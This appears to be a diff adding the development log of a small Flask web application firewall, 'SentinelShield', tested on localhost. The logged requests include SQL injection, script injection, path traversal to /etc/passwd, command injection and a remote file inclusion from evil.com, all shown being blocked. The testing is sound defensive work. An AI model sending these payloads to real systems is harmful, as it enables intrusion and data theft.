+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^
+  File "C:\Users\SAMIR\OneDrive\Desktop\SentinelShield\app.py", line 166, in sentinel_shield
+    signal = Signal(
+        ip=client_ip,
+    ...<5 lines>...
+        payload=str(request.args)
+    )
+TypeError: Signal.__init__() missing 1 required positional argument: 'timestamp'
+2026-02-13 19:39:21,568 | INFO | 127.0.0.1 GET / 500
+2026-02-13 19:39:21,568 | INFO | 127.0.0.1 - - [13/Feb/2026 19:39:21] "[35m[1mGET /?test=normal HTTP/1.1[0m" 500 -
+2026-02-13 19:53:11,668 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-13 19:53:11,669 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 19:54:51,009 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-13 19:54:51,009 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 19:55:48,378 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:48,379 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:48] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:50,887 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:50,888 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:50] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:51,101 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:51,102 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:51] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:51,946 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:51,947 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:51] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:52,170 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:52,171 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:52] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:52,382 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:52,382 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:52] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:52,582 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:52,582 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:52] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:52,770 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:52,770 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:52] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:52,978 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:52,978 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:52] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:53,185 | INFO | 127.0.0.1 GET / 200
+2026-02-13 19:55:53,186 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:53] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 19:55:53,622 | INFO | 127.0.0.1 GET / 429
+2026-02-13 19:55:53,622 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:53] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 19:55:53,837 | INFO | 127.0.0.1 GET / 429
+2026-02-13 19:55:53,837 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:53] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 19:55:54,034 | INFO | 127.0.0.1 GET / 429
+2026-02-13 19:55:54,034 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:54] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 19:55:54,234 | INFO | 127.0.0.1 GET / 429
+2026-02-13 19:55:54,235 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:54] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 19:55:54,469 | INFO | 127.0.0.1 GET / 429
+2026-02-13 19:55:54,470 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:54] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 19:55:54,686 | INFO | 127.0.0.1 GET / 429
+2026-02-13 19:55:54,686 | INFO | 127.0.0.1 - - [13/Feb/2026 19:55:54] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:04,472 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-13 20:00:04,472 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 20:00:09,372 | INFO | 127.0.0.1 GET / 200
+2026-02-13 20:00:09,373 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:09] "GET / HTTP/1.1" 200 -
+2026-02-13 20:00:14,323 | INFO | 127.0.0.1 GET / 200
+2026-02-13 20:00:14,323 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:14] "GET /?name=Sam HTTP/1.1" 200 -
+2026-02-13 20:00:17,285 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:00:17,286 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:17] "[31m[1mGET /?id=1'%20OR%20'1'='1 HTTP/1.1[0m" 403 -
+2026-02-13 20:00:19,925 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:00:19,926 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:19] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-13 20:00:22,051 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:00:22,051 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:22] "[31m[1mGET /?file=../../etc/passwd HTTP/1.1[0m" 403 -
+2026-02-13 20:00:24,586 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:00:24,586 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:24] "[31m[1mGET /?file=..\\\\..\\\\windows\\\\system32 HTTP/1.1[0m" 403 -
+2026-02-13 20:00:27,454 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:00:27,455 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:27] "[31m[1mGET /?cmd=whoami&&dir HTTP/1.1[0m" 403 -
+2026-02-13 20:00:31,342 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:00:31,343 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:31] "[31m[1mGET /?page=http://evil.com/shell.txt HTTP/1.1[0m" 403 -
+2026-02-13 20:00:37,614 | INFO | 127.0.0.1 GET / 200
+2026-02-13 20:00:37,614 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:37] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 20:00:40,378 | INFO | 127.0.0.1 GET / 200
+2026-02-13 20:00:40,378 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:40] "GET /?test=normal HTTP/1.1" 200 -
+2026-02-13 20:00:40,626 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:40,627 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:40] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:40,814 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:40,815 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:40] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:41,021 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:41,021 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:41] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:41,418 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:41,419 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:41] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:41,653 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:41,654 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:41] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:41,834 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:41,834 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:41] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:42,260 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:42,260 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:42] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:42,474 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:42,475 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:42] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:42,642 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:42,643 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:42] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:42,854 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:42,854 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:42] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:43,078 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:43,078 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:43] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:43,266 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:43,267 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:43] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:43,462 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:43,462 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:43] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:43,701 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:43,702 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:43] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:43,918 | INFO | 127.0.0.1 GET / 429
+2026-02-13 20:00:43,918 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:43] "[31m[1mGET /?test=normal HTTP/1.1[0m" 429 -
+2026-02-13 20:00:50,607 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-13 20:00:50,607 | INFO | 127.0.0.1 - - [13/Feb/2026 20:00:50] "GET /metrics HTTP/1.1" 200 -
+2026-02-13 20:08:03,854 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-13 20:08:03,855 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 20:08:18,893 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:08:18,894 | INFO | 127.0.0.1 - - [13/Feb/2026 20:08:18] "[31m[1mGET /?id=1'%20OR%20'1'='1 HTTP/1.1[0m" 403 -
+2026-02-13 20:08:19,738 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:08:19,739 | INFO | 127.0.0.1 - - [13/Feb/2026 20:08:19] "[31m[1mGET /?id=1'%20OR%20'1'='1 HTTP/1.1[0m" 403 -
+2026-02-13 20:08:22,232 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:08:22,232 | INFO | 127.0.0.1 - - [13/Feb/2026 20:08:22] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-13 20:08:23,315 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:08:23,316 | INFO | 127.0.0.1 - - [13/Feb/2026 20:08:23] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-13 20:08:26,883 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:08:26,884 | INFO | 127.0.0.1 - - [13/Feb/2026 20:08:26] "[31m[1mGET /?file=../../etc/passwd HTTP/1.1[0m" 403 -
+2026-02-13 20:08:30,695 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:08:30,696 | INFO | 127.0.0.1 - - [13/Feb/2026 20:08:30] "[31m[1mGET /?file=..\\\\..\\\\windows\\\\system32 HTTP/1.1[0m" 403 -
+2026-02-13 20:08:44,507 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:08:44,508 | INFO | 127.0.0.1 - - [13/Feb/2026 20:08:44] "[31m[1mGET /?page=http://evil.com/shell.txt HTTP/1.1[0m" 403 -
+2026-02-13 20:08:57,912 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-13 20:08:57,913 | INFO | 127.0.0.1 - - [13/Feb/2026 20:08:57] "GET /metrics HTTP/1.1" 200 -
+2026-02-13 20:09:28,273 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:09:28,274 | INFO | 127.0.0.1 - - [13/Feb/2026 20:09:28] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-13 20:34:47,092 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-13 20:34:47,093 | INFO | [33mPress CTRL+C to quit[0m
+2026-02-13 20:34:59,631 | INFO | IP: 127.0.0.1 | Status: ALLOWED
+2026-02-13 20:34:59,632 | INFO | 127.0.0.1 GET / 200
+2026-02-13 20:34:59,633 | INFO | 127.0.0.1 - - [13/Feb/2026 20:34:59] "GET / HTTP/1.1" 200 -
+2026-02-13 20:35:02,240 | INFO | IP: 127.0.0.1 | Status: ALLOWED
+2026-02-13 20:35:02,241 | INFO | 127.0.0.1 GET / 200
+2026-02-13 20:35:02,241 | INFO | 127.0.0.1 - - [13/Feb/2026 20:35:02] "GET /?name=Sam HTTP/1.1" 200 -
+2026-02-13 20:35:21,456 | WARNING | IP: 127.0.0.1 | Attack: SQL Injection | Severity: HIGH | Confidence: 0.65 | Status: BLOCKED
+2026-02-13 20:35:21,457 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:35:21,457 | INFO | 127.0.0.1 - - [13/Feb/2026 20:35:21] "[31m[1mGET /?id=1'%20OR%20'1'='1 HTTP/1.1[0m" 403 -
+2026-02-13 20:35:27,672 | WARNING | IP: 127.0.0.1 | Attack: XSS | Severity: MEDIUM | Confidence: 0.7 | Status: BLOCKED
+2026-02-13 20:35:27,673 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:35:27,673 | INFO | 127.0.0.1 - - [13/Feb/2026 20:35:27] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-13 20:35:35,616 | WARNING | IP: 127.0.0.1 | Attack: Directory Traversal | Severity: MEDIUM | Confidence: 0.75 | Status: BLOCKED
+2026-02-13 20:35:35,617 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:35:35,618 | INFO | 127.0.0.1 - - [13/Feb/2026 20:35:35] "[31m[1mGET /?file=../../etc/passwd HTTP/1.1[0m" 403 -
+2026-02-13 20:35:41,313 | WARNING | IP: 127.0.0.1 | Attack: Directory Traversal | Severity: MEDIUM | Confidence: 0.8 | Status: BLOCKED
+2026-02-13 20:35:41,314 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:35:41,315 | INFO | 127.0.0.1 - - [13/Feb/2026 20:35:41] "[31m[1mGET /?file=..\\\\..\\\\windows\\\\system32 HTTP/1.1[0m" 403 -
+2026-02-13 20:35:44,886 | WARNING | IP: 127.0.0.1 | Attack: Command Injection | Severity: HIGH | Confidence: 0.85 | Status: BLOCKED
+2026-02-13 20:35:44,887 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:35:44,887 | INFO | 127.0.0.1 - - [13/Feb/2026 20:35:44] "[31m[1mGET /?cmd=whoami&&dir HTTP/1.1[0m" 403 -
+2026-02-13 20:35:49,533 | CRITICAL | IP: 127.0.0.1 | Status: BANNED | Duration: 600s
+2026-02-13 20:35:49,534 | WARNING | IP: 127.0.0.1 | Attack: LFI/RFI | Severity: HIGH | Confidence: 0.9 | Status: BLOCKED
+2026-02-13 20:35:49,534 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:35:49,535 | INFO | 127.0.0.1 - - [13/Feb/2026 20:35:49] "[31m[1mGET /?page=http://evil.com/shell.txt HTTP/1.1[0m" 403 -
+2026-02-13 20:35:56,589 | INFO | 127.0.0.1 GET /metrics 200
+2026-02-13 20:35:56,590 | INFO | 127.0.0.1 - - [13/Feb/2026 20:35:56] "GET /metrics HTTP/1.1" 200 -
+2026-02-13 20:37:17,936 | WARNING | IP: 127.0.0.1 | Status: BLOCKED | Reason: IP temporarily banned
+2026-02-13 20:37:17,937 | INFO | 127.0.0.1 GET / 403
+2026-02-13 20:37:17,938 | INFO | 127.0.0.1 - - [13/Feb/2026 20:37:17] "[31m[1mGET /?q=<script>alert(1)</script> HTTP/1.1[0m" 403 -
+2026-02-23 18:19:11,765 | INFO | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://192.168.31.21:5000
+2026-02-23 18:19:11,767 | INFO | [33mPress CTRL+C to quit[0m
